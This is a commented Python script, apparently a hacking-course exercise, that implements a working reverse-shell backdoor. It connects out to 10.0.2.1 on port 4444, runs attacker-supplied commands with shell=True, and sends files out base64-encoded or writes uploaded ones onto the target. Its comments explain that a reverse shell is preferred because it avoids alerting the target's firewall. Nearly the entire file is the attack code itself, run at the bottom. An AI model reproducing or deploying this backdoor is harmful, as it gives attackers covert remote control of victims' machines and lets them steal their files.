#!/usr/share/python3 

import socket
import subprocess
import json 
import os 
import base64

# Backdoor program

#def execute_system_command(command):
#    command = subprocess.check_output(command, shell=True)
#    return command
#
#connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        # First arguement is the address family and second arguement is the socket type
#connection.connect(("10.0.2.1", 4444))                                # ("<ip_address", <port>)
#connection.send("\n[+] Connection established\n")                     # Sending data via connection
#
#while True:
#    command = connection.recv(1024)                                   # (<buffer_size>)  //// buffer_size is the maximum amount of data transfer allowed at one time
#    command_result = execute_system_command(command)
#    connection.send(command_result)
#
#connection.close()                                                    # Close the connection

# Backdoor allows us to get a shell in the target system and execute commands on it
# The target system will run backdoor and hacker system will run a listner that will allow a communication between both the system and the hacker system will hence be
# able to execute system commands on the target system

# Two types of connections are to be considered while programming a backdoor
# Bind shell and Reverse shell

# //// BIND SHELL ////
# Bind shell will open a listner on target system and hacker will connect to it
# This will be done by opening a port on the target system
# Opening a port on target system that has a firewall will alert the target that the port is opened by an unknown application
# Hence, using a bind shell backdoor is not a good idea

# //// REVERSE SHELL ////
# Reverse shell will open a listner on hacker system and target wil connect to it
# This will be done by open a port on the hacker system
# Opening a port on the hacker system will invoke the hacker's firewall which can be disabled and the target system will throw an incomming connection to the hacker 
# Hence, it is beneficial to use reverse shell backdoor

class Backdoor:
    def __init__(self, ip_address, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        # First arguement is the address family and second arguement is the socket type
        self.connection.connect((ip_address, port))                                # ("<ip_address", <port>)

    def execute_system_command(self, command):
        command = subprocess.check_output(command, shell=True)
        return command
    
    def reliable_send(self, data):                                           # It will convert the data into json format and send it to desired location
        json_data = json.dumps(data)                                         # json.dumps encodes the data in json format
        self.connection.send(json_data.encode())                             # .encode() for converting the string (json_data) to byte like object
    #def reliable_receive(self):                                             # It will recieve the json format data and decode it to normal form of data
    #   json_data = self.connection.recv(1024)                               
    #   return json.loads(json_data)                                         # json.loads decodes the json data in normal format

    def reliable_receive(self):                         
        while True:                                                          # Start a infinite loop
            json_data = b""                                                  # Initialize the variable json_data to a empty string (b for converting the string to byte like object)
            try:                                                             # Try to run the given code
                json_data = json_data + self.connection.recv(1024)           # json_data + the recieved connection
                return json.loads(json_data)                                 # return the json_data value
            except ValueError:                                               # Except a ValueError occurs, execute the following code
                continue                                                     # continue to the code (In this case it will get back in the loop and whill try to recieve more data)
    
    def change_work_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:                                       # Read the file as binary
            return base64.b64encode(file.read())                             # Base64 encoding the file to avoid Bad characters in file that will throw error in json packing [UnicodeDecodeError]

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))                            # Base64 decode the data as the backdoor is going to encode it 
            return "[+] Upload successful."

    def run(self):
        while True:
            command = self.reliable_receive()                                 # (<buffer_size>)  //// buffer_size is the maximum amount of data transfer allowed at one time
            try:
                if command[0] == "exit":                                      # Close the connection if the command is "exit"
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:                 # Check the first element of the list and if it is "cd", check if the second element exists. If it exists, the second element is a command and "cd" was a argument to specify change directory        
                    command_result = self.change_work_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command).decode()     # For converting byte like object to string
            except Exception:                                                  # This is to accept any type of error and return this command and hence, not cause the backdoor to crash                     
                command_result = "[-] Error during command execution."
    
            self.reliable_send(command_result)

backdoor = Backdoor("10.0.2.1", 4444)
backdoor.run()

# The lister must have more functions like exit and download and upload as well as change directory functions. 
# To implement this, the command that will be entered by the hacker in the listener will be segregated into two parts. 
# First word will be a arguement and rest of all will be command
# The string that the hacker entered will be seperated into parts on the basis of spaces and if the first word is something like "exit", it will be considered as an arguement
# and the particular function for the arguement will be applied. (exit arguement in this case will exit the program)
